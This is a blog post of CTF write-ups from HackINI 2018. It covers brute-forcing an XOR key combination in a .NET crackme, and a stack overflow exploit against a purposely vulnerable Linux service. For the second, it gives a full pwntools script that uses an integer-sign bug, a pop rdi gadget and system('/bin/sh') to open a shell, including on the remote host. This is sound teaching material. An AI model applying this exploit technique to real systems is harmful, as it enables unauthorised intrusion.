@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HackINI 2018 : Some Writeups :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="The Event HackINI (stands for Hack Initiation) is an event that is held once a year at the higher national school of computer science at Algiers, in a whole day, a CTF competition and workshops on various information security subdomains are held in parallel, this year, it was held on February 10th.
+
+The challenges of the CTF competition are mostly easy-medium, this post will contain some writeups on some of the tasks."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://red0xff.github.io/writeups/hackini18/" />
+
+<link rel="stylesheet" href="https://red0xff.github.io/assets/reminder.css" />
+
+
+<link rel="stylesheet" href="https://red0xff.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://red0xff.github.io/assets/blue.css">
+
+
+
+<link rel="stylesheet" href="https://red0xff.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://red0xff.github.io/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="https://red0xff.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HackINI 2018 : Some Writeups :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever" />
+<meta name="twitter:description" content="The Event HackINI (stands for Hack Initiation) is an event that is held once a year at the higher national school of computer science at Algiers, in a whole day, a CTF competition and workshops on various information security subdomains are held in parallel, this year, it was held on February 10th.
+
+The challenges of the CTF competition are mostly easy-medium, this post will contain some writeups on some of the tasks." />
+<meta name="twitter:site" content="https://red0xff.github.io/" />
+<meta name="twitter:creator" content="Redouane" />
+<meta name="twitter:image" content="">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HackINI 2018 : Some Writeups :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever">
+<meta property="og:description" content="The Event HackINI (stands for Hack Initiation) is an event that is held once a year at the higher national school of computer science at Algiers, in a whole day, a CTF competition and workshops on various information security subdomains are held in parallel, this year, it was held on February 10th.
+
+The challenges of the CTF competition are mostly easy-medium, this post will contain some writeups on some of the tasks." />
+<meta property="og:url" content="https://red0xff.github.io/writeups/hackini18/" />
+<meta property="og:site_name" content="HackINI 2018 : Some Writeups" />
+<meta property="og:image" content="">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2018-02-12 00:00:00 &#43;0200 &#43;0200" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Redouane&#39;s Blog
+  </div>
+</a>
+<div id="typingcode" class="hidden"></div>
+<div id="fences"></div>
+
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/posts/">Posts</a></li>
+        
+      
+        
+          <li><a href="/search/">Search</a></li>
+        
+      
+        
+          <li><a href="/writeups/">Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about/">About</a></li>
+      
+    
+      
+        <li><a href="/posts/">Posts</a></li>
+      
+    
+      
+        <li><a href="/search/">Search</a></li>
+      
+    
+      
+        <li><a href="/writeups/">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://red0xff.github.io/writeups/hackini18/">HackINI 2018 : Some Writeups</a></h1>
+  <div class="post-meta">
+    <span class="post-date">
+      2018-02-12
+    </span>
+    
+    <span class="post-author">::
+      Redouane
+    </span>
+    
+  </div>
+  <p> TOCHECK : writeups</p>
+  
+  <span class="post-tags">
+    
+    #<a href="https://red0xff.github.io/tags/event/">event</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/security/">security</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/reversing/">reversing</a>&nbsp;
+    
+    #<a href="https://red0xff.github.io/tags/pwn/">pwn</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content">
+    <h1 id="the-event">The Event</h1>
+<p>HackINI (stands for Hack Initiation) is an event that is held once a year at the higher national school of computer science at Algiers, in a whole day, a CTF competition and workshops on various information security subdomains are held in parallel, this year, it was held on February 10th.</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109427/hackini18/hackini_bkfimc.jpg"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109427/hackini18/hackini_bkfimc.jpg" alt="HackINI 2018"></a></p>
+<p>The challenges of the CTF competition are mostly easy-medium, this post will contain some writeups on some of the tasks.</p>
+<h1 id="some-writeups">Some Writeups</h1>
+<h2 id="locked-reverse-engineering">Locked (Reverse Engineering)</h2>
+<p>We are given a program that prompts us for a combination of keypresses.</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109430/hackini18/locked_gkbiqz.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109430/hackini18/locked_gkbiqz.png" alt="Locked"></a></p>
+<p>When we select a wrong combination of keys and press check, it displays <code>Wrong password</code>, and if we do it
+three times, the program exits</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109402/hackini18/wrong_password_ffmejv.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109402/hackini18/wrong_password_ffmejv.png" alt="Wrong Password"></a></p>
+<p>Let's start reversing! first, let's identify the file, we could use Detect it Easy, or any other file identifier</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109413/hackini18/die_azvvnl.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109413/hackini18/die_azvvnl.png" alt="Detect it Easy"></a></p>
+<p>Looks like it's a .NET program, let's decompile it to check its code (I'll use <code>dnSpy</code>, a free .NET decompiler).</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109409/hackini18/check_click_fr7bri.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109409/hackini18/check_click_fr7bri.png" alt="Main check"></a></p>
+<p>Hmm, this function is called when we press the Check button, we understand that this.key must equal to <code>-1500809143</code>, also, by following the <code>extractFlag</code> method, we find that it uses our input to print the flag, so patching won't be possible.
+Let's find out where <code>this.key</code> is modified</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109430/hackini18/key_list_i8ugfy.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109430/hackini18/key_list_i8ugfy.png" alt="Key List"></a></p>
+<p><code>this.key</code> is initialized with <code>49153</code>, remember <code>this.key_list</code></p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109406/hackini18/xor_key_fnrsca.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109406/hackini18/xor_key_fnrsca.png" alt="xor_key"></a></p>
+<p><code>this.key</code> is also changed inside the function <code>xor_key</code></p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109418/hackini18/button_clicks_vzrdpp.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109418/hackini18/button_clicks_vzrdpp.png" alt="button_clicks"></a></p>
+<p>And <code>xor_key</code> is called when we toggle the buttons, here is a mapping of the buttons that we press with the indexes of the items that <code>this.key</code> will be xored with.</p>
+<table>
+<thead>
+<tr>
+<th align="center">Button</th>
+<th align="center">Index</th>
+<th align="center">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">A</td>
+<td align="center">0</td>
+<td align="center">1969313763</td>
+</tr>
+<tr>
+<td align="center">B</td>
+<td align="center">1</td>
+<td align="center">-1004853109</td>
+</tr>
+<tr>
+<td align="center">C</td>
+<td align="center">2</td>
+<td align="center">-1187691929</td>
+</tr>
+<tr>
+<td align="center">D</td>
+<td align="center">3</td>
+<td align="center">2118915021</td>
+</tr>
+<tr>
+<td align="center">E</td>
+<td align="center">4</td>
+<td align="center">938975727</td>
+</tr>
+<tr>
+<td align="center">F</td>
+<td align="center">5</td>
+<td align="center">1974205784</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">6</td>
+<td align="center">825185870</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">7</td>
+<td align="center">-872967355</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">8</td>
+<td align="center">569230993</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">9</td>
+<td align="center">-1295940314</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">10</td>
+<td align="center">-1535369140</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">11</td>
+<td align="center">1597785577</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td align="center">12</td>
+<td align="center">-1115177609</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="center">13</td>
+<td align="center">-559038242</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="center">14</td>
+<td align="center">322376503</td>
+</tr>
+</tbody>
+</table>
+<p>The code is straightforward, this.key is initialized with <code>49153</code> when we open the program (in the constructor function), then each time we enable a button, <code>this.key</code> is xored with <code>this.key_list[i]</code>, when we toggle a button off, this.key is xored one second time with the same value, and as we know, two xors cancel each other.</p>
+<p>xor is both associative and commutative, so we must find a combination of any length of the items of <code>key_list</code> such that the xor of all the the elements of the combination, xored with <code>49153</code> gives <code>-1500809143</code>, the number of possibilities to check is the sum of <code>C(16,k)</code> for <code>k</code> ranging from <code>1</code> to <code>16</code>, which is equal to <code>65535</code>, not that much.
+<code>key_list</code> has <code>16</code> elements, we will take each <code>k</code> between <code>1</code> and <code>16</code>, and each time we will check all the combinations of length <code>k</code> of <code>key_list</code>, when we will find one that satisfies the condition, we will print it.
+Ruby code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">key_list <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
+<span style="color:#ae81ff">1969313763</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1004853109</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1187691929</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">2118915021</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">938975727</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">1974205784</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">825185870</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">872967355</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">569230993</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1295940314</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1535369140</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">1597785577</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">1115177609</span><span style="color:#f92672"></span>,
+<span style="color:#f92672">-</span><span style="color:#ae81ff">559038242</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">322376503</span><span style="color:#f92672"></span>,
+<span style="color:#ae81ff">195936478</span>
+<span style="color:#f92672"></span><span style="color:#f92672">]</span>;
+keys <span style="color:#f92672">=</span> <span style="color:#e6db74">%w(</span><span style="color:#e6db74">A B C D E F 1 2 3 4 5 6 7 8 9</span><span style="color:#e6db74">)</span>;
+<span style="color:#ae81ff">1</span><span style="color:#f92672"></span><span style="color:#f92672">.</span>upto(<span style="color:#ae81ff">16</span><span style="color:#f92672"></span>){<span style="color:#f92672">|</span>k<span style="color:#f92672">|</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span>(t<span style="color:#f92672">=</span>key_list<span style="color:#f92672">.</span>combination(k)<span style="color:#f92672">.</span>select{<span style="color:#f92672">|</span>e<span style="color:#f92672">|</span> (<span style="color:#ae81ff">49153</span> <span style="color:#f92672"></span><span style="color:#f92672">^</span> e<span style="color:#f92672">.</span>reduce(<span style="color:#e6db74">:^</span>)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1500809143</span> <span style="color:#f92672"></span>})<span style="color:#f92672">.</span>empty?
+        puts t<span style="color:#f92672">.</span>map{<span style="color:#f92672">|</span>s<span style="color:#f92672">|</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">solution at k=</span><span style="color:#e6db74">#{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74"> : s=</span><span style="color:#e6db74">#{</span>s<span style="color:#f92672">.</span>map<span style="color:#e6db74">{</span><span style="color:#f92672">|</span>e<span style="color:#f92672">|</span> keys<span style="color:#f92672">[</span>key_list<span style="color:#f92672">.</span>index(e)<span style="color:#f92672">]</span> <span style="color:#e6db74">}</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;, &#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>}<span style="color:#f92672">.</span>join(<span style="color:#e6db74">?\n</span>);
+    <span style="color:#66d9ef">end</span>
+}
+gets
+</code></pre></div><p>We run it, and we get one permutation (it does not take time), we try it in our program, and it works!</p>
+<p><code>HackINI{CDE13567}</code></p>
+<h2 id="furthest-point">Furthest Point</h2>
+<p>We are given a Linux executable file, an IP address and a port number, the linux executable is running as a network service on the given server, we must develop an exploit that works on the given executable locally, then we will execute it against the remote server to gain access to it.</p>
+<p>I no longer have access to the server, so I'll run the exploit on my localhost as if it were the real server (I'll refer to it as the server).</p>
+<p>First, we download the challenge file, and we try to run it locally</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109432/hackini18/execution_bklbc2.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109432/hackini18/execution_bklbc2.png" alt="execution"></a></p>
+<p>it displays the name of the user, and then prompts for the number of points, if we enter a number greater than <code>5</code>, it displays : <code>&quot;Bad input : 10 : Maximum number of points is 5&quot;</code>, otherwise, it reads the coordinates of points, and displays the point that is the furthest from the origin <code>(0, 0)</code></p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109402/hackini18/result_execution_rlcdli.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109402/hackini18/result_execution_rlcdli.png" alt="result of execution"></a></p>
+<p>Let's reverse-engineer it to understand how it works (we use <code>radare2</code>)</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109399/hackini18/number_of_points_ji4oe4.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109399/hackini18/number_of_points_ji4oe4.png" alt="number of points"></a></p>
+<p>our input is first converted to int (using <code>atoi</code>), then the result is compared with <code>5</code>, notice the <code>jle</code> instruction, if our input <code>x &lt;= 5</code> then it prompts for the points, otherwise it quits directly (<code>exit(1)</code>)`</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109395/hackini18/main_loop_obyxbe.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109395/hackini18/main_loop_obyxbe.png" alt="main loop"></a></p>
+<p>Let's suppose that our input is <code>&lt;= 5</code> (otherwise the program would quit immediately), we find another loop, for <code>i = 0</code> and while it's below x (i is <code>local_4h</code> in the picture, <code>local_8h</code> is equal to x), it executes what is in the loop, the jump on the right just breaks out of the loop</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109397/hackini18/parse_input_se5iw9.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109397/hackini18/parse_input_se5iw9.png" alt="parse input"></a></p>
+<p>What it does inside the loop: it reads input and saves it in a variable (<code>obj.temp</code>), checks if it's empty (just a newline), if it is, it directly increments the loop counter and goes back to the loop check, otherwise, it compares the input with <code>&quot;stop&quot;</code>, if it's equal, it breaks out of the loop, otherwise, it splits the string to two space-separated integers with strtok, and converts each of them to unsigned long int (<code>strtoul</code>), then it saves them on the stack (we suppose that it's an array of points)</p>
+<p>Notice that <code>jb</code> (jump if below) is not the same as <code>jl</code> (jump if less), <code>jb</code> takes into account unsigned comparison (that is, it considers that the previous comparison took two unsigned values), while <code>jl</code> does signed comparison, the differences appear for example when we compare two values that are not of the same sign, <code>-1</code> is less than <code>0</code> (signed comparison), but <code>-1</code> is far above 0 (when unsigned, <code>-1 = 2**32-1</code> because it's a 32bit integer), so if we put a negative value in x, the jump (jb) will always be taken (as an unsigned int, <code>-1=2**32-1</code>), what about the first condition? it just checks if <code>x &lt;= 5</code>, so a negative value will also be accepted, let's try to enter -1</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109393/hackini18/minus_one_nv1mjb.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109393/hackini18/minus_one_nv1mjb.png" alt="minus one"></a></p>
+<p>We can enter as many points as we want (we can enter more than <code>5</code>), we can send an empty string to increment the array index without overwriting the data it points to, and we can enter stop to stop entering points (break out of the loop), let's try to enter a dozen of points, then quit</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109401/hackini18/segfault_tjgcxm.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109401/hackini18/segfault_tjgcxm.png" alt="segfault"></a></p>
+<p>after entering some points with large coordinates (12370169555883773389 = <code>0xababababcdcdcdcd</code>), we get a segmentation fault, let's investigate with <code>gdb</code></p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109415/hackini18/debugging_segfault_rok51v.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109415/hackini18/debugging_segfault_rok51v.png" alt="debugging the segfault"></a></p>
+<p>we entered &ldquo;12297829382473034410 13527612320720337851&rdquo; (equal to <code>0xaaaaaaaaaaaaaaaa 0xbbbbbbbbbbbbbbbb</code>), then &ldquo;1229782938247303441 2459565876494606882&rdquo; (equal to <code>0x1111111111111111 0x1111111111111111</code>), then &ldquo;17155035695406767581 17155035695406767581&rdquo; (equal to <code>0xee12ee12dddddddd 0xee12ee12dddddddd</code>), as you see, after being converted to long numbers, the coordinates are stored on the stack (in our case, starting from address <code>0x7ffd48ead5b0</code>), as we know, the addresses where the current function will return is also stored on the stack, in our case, it is : &ldquo;<code>0136| 0x7ffd48ead638 --&gt; 0x4012f6 (&lt;__libc_start_main+742&gt;)</code>&rdquo;.</p>
+<p>Our exploit scenario : send a negative number of points, then send some junk points (or just newlines, remember that when we send a newline, the program does not modify the stack, but it still increments the index of the next point in the stack), looking at the stack, we find out that if we send <code>9</code> points, the second coordinate of the nineth point will overwrite the return address, so the program will try to return to whatever we give it there.</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109410/hackini18/checksec_maakg9.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109410/hackini18/checksec_maakg9.png" alt="checksec"></a></p>
+<p>The executable has some protections enabled, and <code>ASLR</code> is probably enabled, the stack is not executable, so we can't return to the stack to execute code on it, but remember that the program first prints the name of the user who ran it, it calls a function whoami, which does <code>system(&quot;whoami&quot;)</code>, so we can return to system, now we need a pointer to <code>&quot;/bin/sh&quot;</code> or the abosolute path of any other
+shell to pass to <code>system</code></p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109431/hackini18/fgets_xvxg71.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109431/hackini18/fgets_xvxg71.png" alt="fgets"></a></p>
+<p>The buffer where our input containing the point coordinates is stored before being processed is in the <code>.bss</code> section (not the stack), remember that it's referenced by radare2 as <code>obj.temp</code>, its address is <code>0x69ee00</code> (we can find it with gdb by putting a breakpoint on the call to gets, or from radare2, or even with the nm command), and <code>PiE</code> is disabled, so if we send a string in that buffer, we can know its address in advance (it's not affected by <code>ASLR</code>), notice that when entering points, the program checks the first four characters of it against the string <code>&quot;stop&quot;</code>, so if we send <code>&quot;stop/bin/sh&quot;</code> it will still break out of the loop, and we will have a pointer to <code>&quot;/bin/sh&quot;</code> at <code>0x69ee00+4</code> (first four characters are <code>&quot;stop&quot;</code>), now we will need to
+put the pointer to <code>&quot;/bin/sh&quot;</code> in <code>rdi</code> (the argument to system)</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109422/hackini18/gadget_jyzc3t.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109422/hackini18/gadget_jyzc3t.png" alt="gadget"></a></p>
+<p>We found a gadget that does exactly that, pop rdi ; ret will pop a value from the stack into the rdi register, then it will return, putting everything together we get the following attack scenario:</p>
+<ul>
+<li>Send a negative number of points</li>
+<li>Send <code>8</code> newlines (empty lines, will keep the stack content)</li>
+<li>Send two space-separated integers, the first one is junk, the second one is the address of our pop rdi gadget (<code>0x04005a6</code>)</li>
+<li>Send two space-separated integers, the first one is <code>0x69ee00+4</code> (first 4 characters at <code>0x69ee00</code> will be <code>&quot;stop&quot;</code>, so <code>0x69ee00+4</code> will point to <code>&quot;/bin/sh&quot;</code>), the second one is the address of system (in our case, the ELF is statically linked, but even if it wasn't, we would have been able to return to its corresponding address in the plt section)</li>
+<li>Send <code>&quot;stop/bin/sh&quot;</code> plus a null byte <code>'\0'</code></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./furthest_point</span><span style="color:#e6db74">&#39;</span>)
+
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># -1 points</span>
+
+<span style="color:#75715e"># fill the buffer (or just leave its content as it is)</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+	p<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005a6</span> <span style="color:#75715e"># pop rdi; ret</span>
+temp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x69ee00</span> <span style="color:#75715e"># address of obj.temp (in the .bss section)</span>
+system <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x408230</span> <span style="color:#75715e"># address of system@plt</span>
+
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0 </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> str(pop_rdi_ret) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># only the second coordinate matters</span>
+p<span style="color:#f92672">.</span>send(str(temp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> str(system) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">stop/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109434/hackini18/local_u1eajz.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109434/hackini18/local_u1eajz.png" alt="local exploit"></a></p>
+<p>The exploit works well locally (I get a shell), let's try it on the server now, I'll just remplace <code>p = process(...)</code> with <code>p = remote(IP, port)</code> in the script</p>
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109403/hackini18/remote_m9eohe.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558109403/hackini18/remote_m9eohe.png" alt="remote exploit"></a></p>
+<p>Works well, I get a shell, I am john, and I can read the content of flag.txt</p>
+<p><code>HackINI2k18{Ints_c4n_b3_s1gned}</code></p>
+<p>I am the author of this challenge, it wasn't solved during the CTF unfortunately.</p>
+<p>Link to download both challenges:
+<a href="https://drive.google.com/file/d/1Dk3q0xUAa7g3GjhGX8aDP_KC4He51004/view?usp=sharing">https://drive.google.com/file/d/1Dk3q0xUAa7g3GjhGX8aDP_KC4He51004/view?usp=sharing</a></p>
+<p>I hope you've enjoyed the challenges :D</p>
+
+  </div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      <span class="button previous">
+        <a href="https://red0xff.github.io/writeups/richelieu_challenge_writeup/">
+          <span class="button__icon">←</span>
+          <span class="button__text">Writeup of the Richelieu challenge</span>
+        </a>
+      </span>
+      
+      
+      <span class="button next">
+        <a href="https://red0xff.github.io/writeups/himayatic17_rev400/">
+          <span class="button__text">Himayatic 2017 - Rev400 Writeup</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "red0xff" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2019 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>:: Proudly hosted on Github</span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://red0xff.github.io/assets/main.js"></script>
+<script src="https://red0xff.github.io/assets/prism.js"></script>
+<script src="https://red0xff.github.io/assets/reminder.js"></script>
+<script src="https://red0xff.github.io/assets/codetyper.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
